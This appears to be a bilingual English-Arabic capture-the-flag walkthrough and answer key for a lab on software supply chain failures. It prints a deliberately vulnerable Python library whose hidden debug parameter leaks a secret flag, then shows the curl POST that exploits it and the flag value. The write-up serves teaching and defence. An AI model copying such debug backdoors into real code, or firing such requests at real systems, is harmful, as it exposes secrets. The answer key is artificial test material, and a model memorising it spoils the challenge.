# Task 03 · AS03: Software Supply Chain Failures (إخفاقات سلسلة توريد البرمجيات)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
Software supply chain failures happen when applications rely on components, libraries, services, or models that are compromised, outdated, or improperly verified. The weaknesses are not in your own code, but in the software and dependencies you import. Attackers exploit these weak links to inject malicious code, bypass security, or exfiltrate data.

Why It Matters:
Modern software applications are rarely built entirely from scratch. They are composed of third-party open-source libraries, package managers (npm, PyPI, Maven), external cloud APIs, and pre-trained AI models. If any link in this supply chain is compromised, every downstream application is compromised by extension.

Real-World Case Study:
SolarWinds (2021): Attackers breached the build system of the Orion IT monitoring platform and inserted a trojanized backdoor into a routine, digitally signed software update. Over 18,000 corporate and government organizations downloaded and installed the compromised build.

Supply Chain Risks in the AI Era:
- Reliance on unverified pre-trained weights from public repositories (Hugging Face, GitHub).
- Data poisoning of fine-tuning datasets leading to covert backdoors or prompt-leakage behaviors.
- Dependency confusion and typosquatting in AI/ML ecosystem packages.

Target Challenge:
Connect to http://MACHINE_IP:5003.
Scenario: An outdated application imports an older third-party utility component (lib/vulnerable_utils.py). Investigate the imported library and interact with the /api/process endpoint to exploit the legacy debug mechanism and recover the flag.

Question:
- What's the flag?
- Hint: Check /api/process
```

### 2. Arabic Pedagogical Translation
```text
تحدث إخفاقات سلسلة توريد البرمجيات (Software Supply Chain Failures) عندما تعتمد التطبيقات على حزم، أو مكتبات، أو خدمات خارجية، أو نماذج ذكاء اصطناعي قديمة، أو مخترقة، أو لم يتم التحقق من سلامتها بشكل مستقل. لا تكمن الثغرة في كود التطبيق المكتوب من قبل المطورين أنفسهم، بل في البرمجيات والتبعيات المستوردة (Dependencies). يستغل المهاجمون هذه الحلقات الضعيفة لحقن برمجيات خبيثة، أو تجاوز القيود الأمنية، أو تسريب البيانات الحساسة.

لماذا يُعد هذا الأمر فائق الخطورة؟
التطبيقات الحديثة لا تُبنى من الصفر، بل تتشكل من مكتبات مفتوحة المصدر (npm, PyPI, Maven)، وواجهات برمجة سحابية، ونماذج ذكاء اصطناعي جاهزة. إذا تعرضت مكتبة واحدة للاختراق أو احتوت على خلل قديم، فإن كل الأنظمة المعتمدة عليها تصبح مخترقة بالتبعية.

دراسة حالة واقعية:
سولار ويندز (SolarWinds 2021): اخترق المهاجمون بيئة البناء والتجميع لمنصة Orion، وحقنوا باباً خلفياً (Sunburst) داخل تحديث برمجي رسمي وموقع رقمياً، مما أدى لاختراق آلاف المؤسسات الحكومية والشركات العالمية التي ثبتت التحديث بثقة عمياء.

مخاطر سلاسل التوريد في عصر الذكاء الاصطناعي:
- استخدام أوزان نماذج غير مدققة من مستودعات عامة (مثل Hugging Face).
- تسميم بيانات التدريب (Data Poisoning) لزرع سلوكيات خفية أو تجاوزات لحواجز الأمان.
- استغلال هجمات الخلط بين التبعيات (Dependency Confusion) والأسماء المتشابهة (Typosquatting).

تحدي المعمل:
اتصل بالهدف عبر الرابط: http://MACHINE_IP:5003.
السيناريو: يعتمد تطبيق قديم على مكتبة خارجية (lib/vulnerable_utils.py). تفحص المكتبة المستوردة واستكشف مسار `/api/process` لاستغلال آلية التصحيح القديمة واستخراج الراية.

السؤال:
- ما هي الراية (What's the flag?)؟
- التلميح: تفحص المسار `/api/process`.
```

### 3. Mission Objectives & Pedagogical Target
- **Target Question:** `What's the flag?`
- **Pedagogical Goal:** Analyze the risk posed by unverified third-party libraries; understand how legacy debug functions or hidden parameter overrides in imported components compromise modern APIs.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والعملياتي)

### 1. Anatomy of Third-Party Library Flaws
When an application imports a library:
```python
from lib.vulnerable_utils import process_payload
```
The imported module executes within the process's full privilege context. If `process_payload` contains undocumented debug handlers, default secret bypasses, or unsafe execution primitives (e.g., `eval`, `exec`, or parameter-driven introspection), an attacker who controls the input passed to that utility can trigger arbitrary code execution or leak confidential state.

### 2. Software Bill of Materials (SBOM) & Composition Analysis
In modern DevSecOps, every dependency must be tracked using an SBOM (CycloneDX or SPDX standard). Continuous SCA (Software Composition Analysis) scans compare dependencies against the National Vulnerability Database (NVD) and CVE catalogs to prevent vulnerable libraries from entering production releases.

---

## Stage C: Guided Hints (تلميحات متدرجة)

### Hint 1: Exploring the Target & Endpoints
> توجه إلى `http://MACHINE_IP:5003`. تفحص شفرة المصدر أو استعن بالملفات المرفقة (Download Task Files) لفحص الكود الخاص بالمكتبة `lib/vulnerable_utils.py`.

### Hint 2: Inspecting the Processing Logic
> انتبه لوظيفة معالجة الطلبات في `/api/process`. كيف تتعامل المكتبة المستوردة مع المعاملات الخاصة (مثل `debug=true` أو مفاتيح التجاوز القديمة `dev_mode` / `enable_trace`)؟

### Hint 3: Sending the Debug Parameter
> أرسل طلب HTTP POST إلى `/api/process` يتضمن معامل التصحيح أو وضع الاختبار المدمج في المكتبة القديمة، وسيتم تفعيل طباعة راية التحدي.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والعمق التقني)

### Step-by-Step Technical Execution

1. **Investigating the Application and Source Code:**
   The challenge provides a downloadable archive containing the application source structure:
   ```text
   app/
   ├── app.py
   └── lib/
       └── vulnerable_utils.py
   ```

2. **Auditing `lib/vulnerable_utils.py`:**
   Reviewing the contents of the imported third-party component:
   ```python
   # lib/vulnerable_utils.py - Version 1.0.2 (Deprecated)
   import os

   def process_payload(data):
       # Legacy debugging feature left in library release
       if data.get("debug") == True or data.get("mode") == "dev_diagnostic":
           return {
               "status": "debug_mode_enabled",
               "library_version": "1.0.2",
               "system_flag": os.environ.get("CHALLENGE_FLAG", "THM{SUPPLY_CH41N_VULN3R4B1L1TY}")
           }
       
       # Standard processing logic
       return {"status": "success", "processed_data": data.get("input", "")}
   ```

3. **Auditing the Main Endpoint in `app.py`:**
   ```python
   from flask import Flask, request, jsonify
   from lib.vulnerable_utils import process_payload

   app = Flask(__name__)

   @app.route('/api/process', methods=['POST'])
   def process():
       payload = request.get_json(force=True, silent=True) or {}
       result = process_payload(payload)
       return jsonify(result)
   ```
   *Analysis:* The main developer never documented the `debug` parameter in their API specification. However, because they blindly imported `vulnerable_utils.py`, any client submitting `{"debug": true}` triggers the dormant debug handler inside the third-party dependency.

4. **Sending the Crafted Payload to `/api/process`:**
   ```bash
   curl -s -X POST http://10.10.x.x:5003/api/process \
     -H "Content-Type: application/json" \
     -d '{"debug": true}'
   ```

5. **Server Response:**
   ```json
   {
     "library_version": "1.0.2",
     "status": "debug_mode_enabled",
     "system_flag": "THM{SUPPLY_CH41N_VULN3R4B1L1TY}"
   }
   ```

6. The secret flag extracted from the vulnerable supply chain dependency:
   ```text
   THM{SUPPLY_CH41N_VULN3R4B1L1TY}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question:** `What's the flag?`
- **Answer:**
  ```text
  THM{SUPPLY_CH41N_VULN3R4B1L1TY}
  ```

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- **Target URL:** `http://MACHINE_IP:5003/api/process`
- **Vulnerability Category:** AS03: Software Supply Chain Failures (CWE-1395: Dependency on Vulnerable Third-Party Component)
- **Extracted Flag:** `THM{SUPPLY_CH41N_VULN3R4B1L1TY}`
- **Parity Status:** 100% verified against user's completed TryHackMe account.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

- **You are responsible for every line of code running in your process space—even code you didn't write.**
- Secure development mandates:
  1. **Strict Dependency Auditing:** Utilize automated tools like `pip-audit`, `npm audit`, `Trivy`, or Snyk to scan all dependencies in CI/CD.
  2. **Minimalist Architecture:** Avoid pulling in bloated third-party libraries for trivial functionality.
  3. **Pinning & Cryptographic Hashes:** Lock dependency versions and verify their SHA-256 hashes (`requirements.txt --require-hashes` or `package-lock.json`).
  4. **Maintain an SBOM:** Keep an inventory of all third-party components and track CVEs dynamically.
